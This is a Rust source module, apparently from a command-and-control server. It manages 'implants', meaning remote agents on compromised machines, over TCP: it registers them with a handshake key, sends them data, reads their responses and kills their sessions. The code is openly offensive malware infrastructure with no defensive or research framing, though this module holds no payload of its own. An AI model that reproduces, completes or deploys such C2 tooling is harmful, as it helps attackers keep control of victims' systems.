use std::{os::unix::prelude::{RawFd}, net::{SocketAddr, TcpStream}};

use log::info;

use super::implant::Implant;

pub struct Cnc {
    implants: Vec<Implant>
}

impl Cnc {
    pub fn new() -> Self {
        Cnc {
            implants: Vec::new()
        }
    }

    pub fn get_implants(&self) -> &Vec<Implant> {
        &self.implants
    }

    pub fn get_implant_fd_list(&self) -> Vec<RawFd> {
        self.implants.iter().map(|imp| imp.get_fd()).collect()
    }

    pub fn get_implant_write_fd_list(&self) -> Vec<RawFd> {
        self.implants.iter().filter_map(|imp| {
            if imp.ready_to_send() {
                Some(imp.get_fd())
            } else { None }
        }).collect()
    }

    pub fn add_implant(&mut self, addr: SocketAddr, stream: TcpStream, helo_key: u32) {
        stream.set_nonblocking(true).unwrap();
        let implant: Implant = Implant::new(addr,helo_key, stream);
        self.implants.push(implant)
    }

    pub fn get_implant_by_fd(&mut self, fd: RawFd) -> Option<&mut Implant> {
        for i in &mut self.implants {
            if i.get_fd() == fd {
                return Some(i)
            }
        };
        None
    }

    pub fn kill_implant_by_fd(&mut self, fd: RawFd) {
        info!("Killing implant `{}'", fd);
        let check: bool = match self.get_implant_by_fd(fd) {
            Some(i) => {
                i.kill();
                true
            },
            None => {
                false
            }
        };
        if check {
            self.implants.retain(|imp| (imp.get_fd() != fd) && (imp.get_fd() != -1));
        }
    }

    pub fn send_to_implant(&mut self, fd: RawFd, buf: &[u8]) {
        match self.get_implant_by_fd(fd) {
            Some(implant) => {
                implant.write(&buf);
                implant.send().unwrap();
            },
            None => ()
        }
    }

    pub fn read_from_implant(&mut self, fd: RawFd) -> std::io::Result<()> {
        match self.get_implant_by_fd(fd) {
            Some(implant) => {
                let bytes_read = implant.recv()?;
                if bytes_read == 0 {
                    self.kill_implant_by_fd(fd);
                    return Ok(());
                }
                match implant.handle() {
                    Ok(_) => Ok(()),
                    Err(e) => {
                        println!("{:?}", e);
                        self.kill_implant_by_fd(fd);
                        return Ok(())
                    }
                }
            },
            None => Ok(())
        }
    }
}